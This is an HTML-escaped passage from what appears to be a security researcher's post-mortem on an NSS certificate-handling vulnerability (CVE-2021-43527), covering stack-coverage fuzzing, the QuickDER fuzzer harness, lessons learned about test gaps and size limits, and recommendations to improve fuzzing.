class=\"c12\"&gt;size_t&lt;/span&gt;&lt;span class=\"c1\"&gt;&amp;nbsp;b&lt;/span&gt;&lt;span class=\"c19\"&gt;)&lt;/span&gt;&lt;span class=\"c1\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"c19\"&gt;{&lt;/span&gt;&lt;span class=\"c1\"&gt;&amp;nbsp;cmd_handler_bar&lt;/span&gt;&lt;span class=\"c19\"&gt;(&lt;/span&gt;&lt;span class=\"c1\"&gt;a&lt;/span&gt;&lt;span class=\"c23 c21\"&gt;,&lt;/span&gt;&lt;span class=\"c1\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"c12\"&gt;sizeof&lt;/span&gt;&lt;span class=\"c1\"&gt;&amp;nbsp;buf&lt;/span&gt;&lt;span class=\"c19\"&gt;)&lt;/span&gt;&lt;span class=\"c23 c21\"&gt;;&lt;/span&gt;&lt;span class=\"c1\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"c19\"&gt;}&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c3\"&gt;&lt;span class=\"c1 c8\"&gt;&amp;nbsp;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c3\"&gt;&lt;span class=\"c12\"&gt;typedef&lt;/span&gt;&lt;span class=\"c1\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"c12\"&gt;void&lt;/span&gt;&lt;span class=\"c1\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"c19\"&gt;(&lt;/span&gt;&lt;span class=\"c23 c21\"&gt;*&lt;/span&gt;&lt;span class=\"c1\"&gt;&amp;nbsp;dispatch_t&lt;/span&gt;&lt;span class=\"c19\"&gt;)(&lt;/span&gt;&lt;span class=\"c12\"&gt;int&lt;/span&gt;&lt;span class=\"c23 c21\"&gt;,&lt;/span&gt;&lt;span class=\"c1\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"c12\"&gt;size_t&lt;/span&gt;&lt;span class=\"c19\"&gt;)&lt;/span&gt;&lt;span class=\"c23 c21\"&gt;;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c3\"&gt;&lt;span class=\"c1 c8\"&gt;&amp;nbsp;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c3\"&gt;&lt;span class=\"c1\"&gt;dispatch_t handlers&lt;/span&gt;&lt;span class=\"c19\"&gt;[&lt;/span&gt;&lt;span class=\"c1\"&gt;UCHAR_MAX&lt;/span&gt;&lt;span class=\"c19\"&gt;]&lt;/span&gt;&lt;span class=\"c1\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"c23 c21\"&gt;=&lt;/span&gt;&lt;span class=\"c1\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"c19\"&gt;{&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c3\"&gt;&lt;span class=\"c1\"&gt;&amp;nbsp; &amp;nbsp; cmd_handler_foo&lt;/span&gt;&lt;span class=\"c23 c21\"&gt;,&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c3\"&gt;&lt;span class=\"c1\"&gt;&amp;nbsp; &amp;nbsp; cmd_handler_bar&lt;/span&gt;&lt;span class=\"c23 c21\"&gt;,&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c3\"&gt;&lt;span class=\"c1\"&gt;&amp;nbsp; &amp;nbsp; cmd_handler_baz&lt;/span&gt;&lt;span class=\"c23 c21\"&gt;,&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c3\"&gt;&lt;span class=\"c19\"&gt;}&lt;/span&gt;&lt;span class=\"c23 c21\"&gt;;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c3\"&gt;&lt;span class=\"c1 c8\"&gt;&amp;nbsp;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c3\"&gt;&lt;span class=\"c12\"&gt;int&lt;/span&gt;&lt;span class=\"c1\"&gt;&amp;nbsp;main&lt;/span&gt;&lt;span class=\"c19\"&gt;(&lt;/span&gt;&lt;span class=\"c12\"&gt;int&lt;/span&gt;&lt;span class=\"c1\"&gt;&amp;nbsp;argc&lt;/span&gt;&lt;span class=\"c21 c23\"&gt;,&lt;/span&gt;&lt;span class=\"c1\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"c12\"&gt;char&lt;/span&gt;&lt;span class=\"c1\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"c23 c21\"&gt;**&lt;/span&gt;&lt;span class=\"c1\"&gt;argv&lt;/span&gt;&lt;span class=\"c19\"&gt;)&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c3\"&gt;&lt;span class=\"c19\"&gt;{&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c3\"&gt;&lt;span class=\"c1\"&gt;&amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=\"c12\"&gt;int&lt;/span&gt;&lt;span class=\"c1\"&gt;&amp;nbsp;cmd&lt;/span&gt;&lt;span class=\"c23 c21\"&gt;;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c3\"&gt;&lt;span class=\"c1 c8\"&gt;&amp;nbsp;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c3\"&gt;&lt;span class=\"c1\"&gt;&amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=\"c21 c42\"&gt;while&lt;/span&gt;&lt;span class=\"c1\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"c19\"&gt;((&lt;/span&gt;&lt;span class=\"c1\"&gt;cmd &lt;/span&gt;&lt;span class=\"c23 c21\"&gt;=&lt;/span&gt;&lt;span class=\"c1\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"c28 c21\"&gt;getchar&lt;/span&gt;&lt;span class=\"c19\"&gt;())&lt;/span&gt;&lt;span class=\"c1\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"c23 c21\"&gt;!=&lt;/span&gt;&lt;span class=\"c1\"&gt;&amp;nbsp;EOF&lt;/span&gt;&lt;span class=\"c19\"&gt;)&lt;/span&gt;&lt;span class=\"c1\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"c19\"&gt;{&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c3\"&gt;&lt;span class=\"c1\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=\"c42 c21\"&gt;if&lt;/span&gt;&lt;span class=\"c1\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"c19\"&gt;(&lt;/span&gt;&lt;span class=\"c1\"&gt;handlers&lt;/span&gt;&lt;span class=\"c19\"&gt;[&lt;/span&gt;&lt;span class=\"c1\"&gt;cmd&lt;/span&gt;&lt;span class=\"c19\"&gt;])&lt;/span&gt;&lt;span class=\"c1\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"c19\"&gt;{&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c3\"&gt;&lt;span class=\"c1\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; handlers&lt;/span&gt;&lt;span class=\"c19\"&gt;[&lt;/span&gt;&lt;span class=\"c1\"&gt;cmd&lt;/span&gt;&lt;span class=\"c19\"&gt;](&lt;/span&gt;&lt;span class=\"c21 c28\"&gt;getchar&lt;/span&gt;&lt;span class=\"c19\"&gt;()&lt;/span&gt;&lt;span class=\"c23 c21\"&gt;,&lt;/span&gt;&lt;span class=\"c1\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"c28 c21\"&gt;getchar&lt;/span&gt;&lt;span class=\"c19\"&gt;())&lt;/span&gt;&lt;span class=\"c23 c21\"&gt;;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c3\"&gt;&lt;span class=\"c1\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=\"c19\"&gt;}&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c3\"&gt;&lt;span class=\"c1\"&gt;&amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=\"c19\"&gt;}&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c3\"&gt;&lt;span class=\"c19\"&gt;}&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr class=\"c29\"&gt;&lt;td class=\"c15\" colspan=\"1\" rowspan=\"1\"&gt;\n &lt;p class=\"c3 c33 c16 subtitle\" id=\"h.9a31y6u3z63v\"&gt;&lt;span class=\"c32\"&gt;Fig 4.&lt;/span&gt;&lt;span&gt;&amp;nbsp;The coverage &lt;/span&gt;&lt;span&gt;of command&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"c32\"&gt;bar&lt;/span&gt;&lt;span&gt;&amp;nbsp;is a superset of command &lt;/span&gt;&lt;span class=\"c32\"&gt;foo&lt;/span&gt;&lt;span&gt;, so an input containing the latter would be discarded during corpus minimization. There is a vulnerability unreachable via command &lt;/span&gt;&lt;span class=\"c32\"&gt;bar &lt;/span&gt;&lt;span&gt;that might never be discovered. Stack coverage would correctly keep both inputs.&lt;/span&gt;&lt;sup&gt;&lt;a href=\"#ftnt1\" id=\"ftnt_ref1\" name=\"ftnt_ref1\"&gt;[1]&lt;/a&gt;&lt;/sup&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;\n &lt;p class=\"c2\"&gt;&lt;span class=\"c11 c8\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c2\"&gt;&lt;span class=\"c11 c8\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c13\"&gt;&lt;span class=\"c11 c8\"&gt;To solve this problem, I&amp;rsquo;ve been experimenting with monitoring the call stack during execution.&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c2\"&gt;&lt;span class=\"c11 c8\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c13\"&gt;&lt;span class=\"c11 c8\"&gt;The naive implementation is too slow to be practical, but after a lot of optimization I had come up with a library that was fast enough to be integrated into coverage-guided fuzzing, and was testing how it performed with NSS and other libraries.&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c2\"&gt;&lt;span class=\"c11 c8\"&gt;&lt;/span&gt;&lt;/p&gt;&lt;h2 class=\"c13 c16\" id=\"h.hx3w7e9emdvh\"&gt;&lt;span class=\"c24 c8\"&gt;Object Isolation&lt;/span&gt;&lt;/h2&gt;\n &lt;p class=\"c2\"&gt;&lt;span class=\"c11 c8\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c13\"&gt;&lt;span class=\"c11 c8\"&gt;Many data types are constructed from smaller records. PNG files are made of chunks, PDF files are made of streams, ELF files are made of sections, and X.509 certificates are made of ASN.1 TLV items. If a fuzzer has some understanding of the underlying format, it can isolate these records and extract the one(s) causing some new stack trace to be found.&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c2\"&gt;&lt;span class=\"c11 c8\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c13\"&gt;&lt;span class=\"c11 c8\"&gt;The fuzzer I was using is able to isolate and extract interesting new ASN.1 OIDs, SEQUENCEs, INTEGERs, and so on. Once extracted, it can then randomly combine or insert them into template data. This isn&amp;rsquo;t really a new idea, but is a new implementation. I&amp;#39;m planning to open source this code in the future.&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c2\"&gt;&lt;span class=\"c11 c8\"&gt;&lt;/span&gt;&lt;/p&gt;&lt;h2 class=\"c13 c16\" id=\"h.eyoyd5te8xd4\"&gt;&lt;span class=\"c24 c8\"&gt;Do these approaches work?&lt;/span&gt;&lt;/h2&gt;\n &lt;p class=\"c2\"&gt;&lt;span class=\"c11 c8\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c13\"&gt;&lt;span class=\"c11 c8\"&gt;I wish that I could say that discovering this bug validates my ideas, but I&amp;rsquo;m not sure it does. I was doing some moderately novel fuzzing, but I see no reason this bug couldn&amp;rsquo;t have been found earlier with even rudimentary fuzzing techniques.&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c2\"&gt;&lt;span class=\"c11 c8\"&gt;&lt;/span&gt;&lt;/p&gt;&lt;h2 class=\"c13 c16\" id=\"h.gjjikaq7urz2\"&gt;&lt;span class=\"c24 c8\"&gt;Lessons Learned&lt;/span&gt;&lt;/h2&gt;\n &lt;p class=\"c2\"&gt;&lt;span class=\"c24 c8\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c13\"&gt;&lt;span class=\"c11 c8\"&gt;How did extensive, customized fuzzing with impressive coverage metrics fail to discover this bug?&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c2\"&gt;&lt;span class=\"c11 c8\"&gt;&lt;/span&gt;&lt;/p&gt;&lt;h3 class=\"c13 c16\" id=\"h.jjxdnfbzkeky\"&gt;&lt;span class=\"c24 c8\"&gt;What went wrong&lt;/span&gt;&lt;/h3&gt;\n &lt;p class=\"c2\"&gt;&lt;span class=\"c11 c8\"&gt;&lt;/span&gt;&lt;/p&gt;&lt;h4 class=\"c13 c16\" id=\"h.tq5bofk5duby\"&gt;&lt;span&gt;Issue #1 &lt;/span&gt;&lt;span class=\"c35\"&gt;Missing end-to-end testing&lt;/span&gt;&lt;span class=\"c6\"&gt;.&lt;/span&gt;&lt;/h4&gt;\n &lt;p class=\"c2\"&gt;&lt;span class=\"c11 c8\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c13\"&gt;&lt;span&gt;NSS is a &lt;/span&gt;&lt;span class=\"c26\"&gt;&lt;a class=\"c91\" href=\"https://developer.mozilla.org/en-US/docs/Mozilla/Projects/NSS/NSS_API_Guidelines\"&gt;modular&lt;/a&gt;&lt;/span&gt;&lt;span&gt;&amp;nbsp;library. This layered design is reflected in the &lt;/span&gt;&lt;span class=\"c26\"&gt;&lt;a class=\"c91\" href=\"https://searchfox.org/nss/source/fuzz/\"&gt;fuzzing&lt;/a&gt;&lt;/span&gt;&lt;span&gt;&amp;nbsp;approach, as each component is fuzzed independently. For example, the &lt;/span&gt;&lt;span class=\"c26\"&gt;&lt;a class=\"c91\" href=\"https://developer.mozilla.org/en-US/docs/Mozilla/Projects/NSS/NSS_Tech_Notes/nss_tech_note1#how_to_use_the_nss_asn.1_and_quickder_decoders\"&gt;QuickDER&lt;/a&gt;&lt;/span&gt;&lt;span&gt;&amp;nbsp;decoder is tested &lt;/span&gt;&lt;span class=\"c26\"&gt;&lt;a class=\"c91\" href=\"https://searchfox.org/nss/source/fuzz/quickder_target.cc\"&gt;extensively&lt;/a&gt;&lt;/span&gt;&lt;span&gt;, but the fuzzer simply &lt;/span&gt;&lt;span class=\"c26\"&gt;&lt;a class=\"c91\" href=\"https://searchfox.org/nss/rev/5f2fa238b58c9158a52c0681ca2a67958a353082/fuzz/quickder_target.cc#72\"&gt;creates and discards&lt;/a&gt;&lt;/span&gt;&lt;span class=\"c11 c8\"&gt;&amp;nbsp;objects and never uses them.&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c2\"&gt;&lt;span class=\"c11 c8\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c2\"&gt;&lt;span class=\"c11 c8\"&gt;&lt;/span&gt;&lt;/p&gt;&lt;a id=\"t.f4e0f36d5a94fbada814aadd6ad3730de37e434f\"&gt;&lt;/a&gt;&lt;a id=\"t.4\"&gt;&lt;/a&gt;&lt;table class=\"c4\"&gt;&lt;tbody&gt;&lt;tr class=\"c29\"&gt;&lt;td class=\"c15\" colspan=\"1\" rowspan=\"1\"&gt;\n &lt;p class=\"c3\"&gt;&lt;span class=\"c5\"&gt;extern&lt;/span&gt;&lt;span class=\"c0\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"c21 c22\"&gt;&amp;quot;C&amp;quot;&lt;/span&gt;&lt;span class=\"c0\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"c5\"&gt;int&lt;/span&gt;&lt;span class=\"c0\"&gt;&amp;nbsp;LLVMFuzzerTestOneInput(&lt;/span&gt;&lt;span class=\"c5\"&gt;const&lt;/span&gt;&lt;span class=\"c0 c8\"&gt;&amp;nbsp;uint8_t *Data, size_t Size) {&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c3\"&gt;&lt;span class=\"c0\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"c5\"&gt;char&lt;/span&gt;&lt;span class=\"c0 c8\"&gt;&amp;nbsp;*dest[2048];&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c31\"&gt;&lt;span class=\"c0 c8\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c3\"&gt;&lt;span class=\"c0\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"c5\"&gt;for&lt;/span&gt;&lt;span class=\"c0\"&gt;&amp;nbsp;(&lt;/span&gt;&lt;span class=\"c5\"&gt;auto&lt;/span&gt;&lt;span class=\"c0 c8\"&gt;&amp;nbsp;tpl : templates) {&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c3\"&gt;&lt;span class=\"c0 c8\"&gt;&amp;nbsp; &amp;nbsp;PORTCheapArenaPool pool;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c3\"&gt;&lt;span class=\"c0\"&gt;&amp;nbsp; &amp;nbsp;SECItem buf = {siBuffer, &lt;/span&gt;&lt;span class=\"c5\"&gt;const_cast&lt;/span&gt;&lt;span class=\"c0\"&gt;&amp;lt;&lt;/span&gt;&lt;span class=\"c5\"&gt;unsigned&lt;/span&gt;&lt;span class=\"c0\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"c5\"&gt;char&lt;/span&gt;&lt;span class=\"c0 c8\"&gt;&amp;nbsp;*&amp;gt;(Data),&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c3\"&gt;&lt;span class=\"c0\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=\"c5\"&gt;static_cast&lt;/span&gt;&lt;span class=\"c0\"&gt;&amp;lt;&lt;/span&gt;&lt;span class=\"c5\"&gt;unsigned&lt;/span&gt;&lt;span class=\"c0\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"c5\"&gt;int&lt;/span&gt;&lt;span class=\"c0 c8\"&gt;&amp;gt;(Size)};&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c31\"&gt;&lt;span class=\"c0 c8\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c3\"&gt;&lt;span class=\"c0 c8\"&gt;&amp;nbsp; &amp;nbsp;PORT_InitCheapArena(&amp;amp;pool, DER_DEFAULT_CHUNKSIZE);&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c3\"&gt;&lt;span class=\"c0\"&gt;&amp;nbsp; &amp;nbsp;(&lt;/span&gt;&lt;span class=\"c5\"&gt;void&lt;/span&gt;&lt;span class=\"c0 c8\"&gt;)SEC_QuickDERDecodeItem(&amp;amp;pool.arena, dest, tpl, &amp;amp;buf);&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c3\"&gt;&lt;span class=\"c0 c8\"&gt;&amp;nbsp; &amp;nbsp;PORT_DestroyCheapArena(&amp;amp;pool);&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c34\"&gt;&lt;span class=\"c0\"&gt;&amp;nbsp;}&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr class=\"c29\"&gt;&lt;td class=\"c15\" colspan=\"1\" rowspan=\"1\"&gt;\n &lt;p class=\"c3 c16 subtitle\" id=\"h.9rchnmg47ypy\"&gt;&lt;span class=\"c32\"&gt;Fig 5.&lt;/span&gt;&lt;span class=\"c8 c30\"&gt;&amp;nbsp;The QuickDER fuzzer simply creates and discards objects. This verifies the ASN.1 parsing, but not whether other components handle the resulting objects correctly.&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;\n &lt;p class=\"c2 c43\"&gt;&lt;span class=\"c11 c8\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c2\"&gt;&lt;span class=\"c11 c8\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c13\"&gt;&lt;span&gt;This fuzzer might have produced a &lt;/span&gt;&lt;span class=\"c21\"&gt;SECKEYPublicKey&lt;/span&gt;&lt;span class=\"c11 c8\"&gt;&amp;nbsp;that could have reached the vulnerable code, but as the result was never used to verify a signature, the bug could never be discovered.&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c2\"&gt;&lt;span class=\"c11 c8\"&gt;&lt;/span&gt;&lt;/p&gt;&lt;h4 class=\"c13 c16\" id=\"h.y3p8hf8j0qqo\"&gt;&lt;span&gt;Issue #2 &lt;/span&gt;&lt;span class=\"c35\"&gt;Arbitrary size limits&lt;/span&gt;&lt;span class=\"c6\"&gt;.&lt;/span&gt;&lt;/h4&gt;\n &lt;p class=\"c2\"&gt;&lt;span class=\"c11 c8\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c13\"&gt;&lt;span&gt;There is an arbitrary limit of &lt;/span&gt;&lt;span class=\"c26\"&gt;&lt;a class=\"c91\" href=\"https://searchfox.org/nss/source/fuzz/options/quickder.options\"&gt;10000 bytes&lt;/a&gt;&lt;/span&gt;&lt;span class=\"c11 c8\"&gt;&amp;nbsp;placed on fuzzed input. There is no such limit within NSS; many structures can exceed this size. This vulnerability demonstrates that errors happen at extremes, so this limit should be chosen thoughtfully.&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c2\"&gt;&lt;span class=\"c11 c8\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c13\"&gt;&lt;span&gt;A reasonable choice might be 2&lt;/span&gt;&lt;span class=\"c20\"&gt;24&lt;/span&gt;&lt;span&gt;-1 bytes, the &lt;/span&gt;&lt;span class=\"c26\"&gt;&lt;a class=\"c91\" href=\"https://datatracker.ietf.org/doc/html/rfc8446#section-4.4.2\"&gt;largest possible&lt;/a&gt;&lt;/span&gt;&lt;span class=\"c11 c8\"&gt;&amp;nbsp;certificate that can be presented by a server during a TLS handshake negotiation.&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c2\"&gt;&lt;span class=\"c11 c8\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c13\"&gt;&lt;span&gt;While NSS might handle objects even larger than this, TLS cannot possibly be involved, reducing the overall severity of any vulnerabilities missed.&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c2\"&gt;&lt;span class=\"c11 c8\"&gt;&lt;/span&gt;&lt;/p&gt;&lt;h4 class=\"c13 c16\" id=\"h.fny13amxfoss\"&gt;&lt;span&gt;Issue #3 &lt;/span&gt;&lt;span class=\"c35\"&gt;Misleading metrics&lt;/span&gt;&lt;span class=\"c6\"&gt;.&lt;/span&gt;&lt;/h4&gt;\n &lt;p class=\"c2\"&gt;&lt;span class=\"c11 c46\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c13\"&gt;&lt;span class=\"c11 c8\"&gt;All of the NSS fuzzers are represented in combined coverage metrics by oss-fuzz, rather than their individual coverage. This data proved misleading, as the vulnerable code is fuzzed extensively but by fuzzers that could not possibly generate a relevant input.&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c2\"&gt;&lt;span class=\"c11 c8\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c13\"&gt;&lt;span&gt;This is because fuzzers like the &lt;/span&gt;&lt;span class=\"c26\"&gt;&lt;a class=\"c91\" href=\"https://searchfox.org/nss/source/fuzz/tls_server_target.cc\"&gt;tls_server_target&lt;/a&gt;&lt;/span&gt;&lt;span&gt;&amp;nbsp;use fixed, &lt;/span&gt;&lt;span class=\"c26\"&gt;&lt;a class=\"c91\" href=\"https://searchfox.org/nss/source/fuzz/tls_server_certs.cc\"&gt;hardcoded&lt;/a&gt;&lt;/span&gt;&lt;span class=\"c11 c8\"&gt;&amp;nbsp;certificates. This exercises code relevant to certificate verification, but only fuzzes TLS messages and protocol state changes.&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c2\"&gt;&lt;span class=\"c11 c8\"&gt;&lt;/span&gt;&lt;/p&gt;&lt;h3 class=\"c13 c16\" id=\"h.5iljytmv85wn\"&gt;&lt;span class=\"c24 c8\"&gt;What Worked&lt;/span&gt;&lt;/h3&gt;\n &lt;p class=\"c2\"&gt;&lt;span class=\"c24 c8\"&gt;&lt;/span&gt;&lt;/p&gt;&lt;ul style=\"padding: 0;\" class=\"c17 lst-kix_4idwybng3hbx-0 start\"&gt;&lt;li style=\"margin-left: 46pt;\" class=\"c13 c27 li-bullet-0\"&gt;&lt;span&gt;The design of the mozilla::pkix validation library prevented this bug from being worse than it could have been. &lt;/span&gt;&lt;span class=\"c11 c8\"&gt;Unfortunately it is unused outside of Firefox and Thunderbird.&lt;/span&gt;&lt;/li&gt;&lt;/ul&gt;\n &lt;p class=\"c2\"&gt;&lt;span class=\"c11 c8\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c13\"&gt;&lt;span class=\"c11 c8\"&gt;It&amp;rsquo;s debatable whether this was just good fortune or not. It seems likely RSA-PSS would eventually be permitted by mozilla::pkix, even though it was not today.&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c2\"&gt;&lt;span class=\"c8 c11\"&gt;&lt;/span&gt;&lt;/p&gt;&lt;h2 class=\"c13 c16\" id=\"h.t0ijbutqkb5h\"&gt;&lt;span class=\"c8 c24\"&gt;Recommendations&lt;/span&gt;&lt;/h2&gt;\n &lt;p class=\"c2\"&gt;&lt;span class=\"c11 c8\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c13\"&gt;&lt;span class=\"c11 c8\"&gt;This issue demonstrates that even extremely well-maintained C/C++ can have fatal, trivial mistakes.&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c2\"&gt;&lt;span class=\"c11 c8\"&gt;&lt;/span&gt;&lt;/p&gt;&lt;h3 class=\"c13 c16\" id=\"h.yesvwttsgrsf\"&gt;&lt;span class=\"c24 c8\"&gt;Short Term&lt;/span&gt;&lt;/h3&gt;\n &lt;p class=\"c2\"&gt;&lt;span class=\"c24 c8\"&gt;&lt;/span&gt;&lt;/p&gt;&lt;ul style=\"padding: 0;\" class=\"c17 lst-kix_x7i5vtjupm2f-0 start\"&gt;&lt;li style=\"margin-left: 46pt;\" class=\"c13 c27 li-bullet-0\"&gt;&lt;span&gt;Raise the maximum size of ASN.1 objects produced by libFuzzer from 10,000 to 2&lt;/span&gt;&lt;span class=\"c20\"&gt;24&lt;/span&gt;&lt;span class=\"c11 c8\"&gt;-1 = 16,777,215 &amp;nbsp;bytes.&lt;/span&gt;&lt;/li&gt;&lt;/ul&gt;&lt;ul style=\"padding: 0;\" class=\"c17 lst-kix_wy7koemfbmv1-0 start\"&gt;&lt;li style=\"margin-left: 46pt;\" class=\"c13 c27 li-bullet-0\"&gt;&lt;span class=\"c11 c8\"&gt;The QuickDER fuzzer should call some relevant APIs with any objects successfully created before destroying them.&lt;/span&gt;&lt;/li&gt;&lt;li style=\"margin-left: 46pt;\" class=\"c13 c27 li-bullet-0\"&gt;&lt;span&gt;The oss-fuzz code coverage metrics should be divided by fuzzer, not by project.&lt;/span&gt;&lt;/li&gt;&lt;/ul&gt;\n &lt;p class=\"c2\"&gt;&lt;span class=\"c11 c8\"&gt;&lt;/span&gt;&lt;/p&gt;&lt;h1 class=\"c13 c16\" id=\"h.i49j9otzq1oi\"&gt;&lt;span class=\"c24 c8\"&gt;Solution&lt;/span&gt;&lt;/h1&gt;\n &lt;p class=\"c2\"&gt;&lt;span class=\"c11 c8\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c13\"&gt;&lt;span&gt;This vulnerability is &lt;/span&gt;&lt;span&gt;CVE-2021-43527,&lt;/span&gt;&lt;span&gt;&amp;nbsp;and is resolved in &lt;/span&gt;&lt;span class=\"c26\"&gt;&lt;a class=\"c91\" href=\"https://www.mozilla.org/en-US/security/advisories/\"&gt;NSS 3.73.0&lt;/a&gt;&lt;/span&gt;&lt;span class=\"c11 c8\"&gt;. If you are a vendor that distributes NSS in your products, you will most likely need to update or backport the patch.&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c2\"&gt;&lt;span class=\"c11 c8\"&gt;&lt;/span&gt;&lt;/p&gt;&lt;h1 class=\"c13 c16\" id=\"h.9canxlbf0rtp\"&gt;&lt;span class=\"c24 c8\"&gt;Credits&lt;/span&gt;&lt;/h1&gt;\n &lt;p class=\"c2\"&gt;&lt;span class=\"c11 c8\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c13\"&gt;&lt;span&gt;I would not have been able to find this bug without assistance from my colleagues from Ch&lt;/span&gt;&lt;span&gt;rome, Ryan S&lt;/span&gt;&lt;span class=\"c11 c8\"&gt;leevi and David Benjamin, who helped answer my ASN.1 encoding questions and engaged in thoughtful discussion on the topic.&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c2\"&gt;&lt;span class=\"c11 c8\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c13\"&gt;&lt;span&gt;Thanks to the NSS team, who helped triage and analyze the 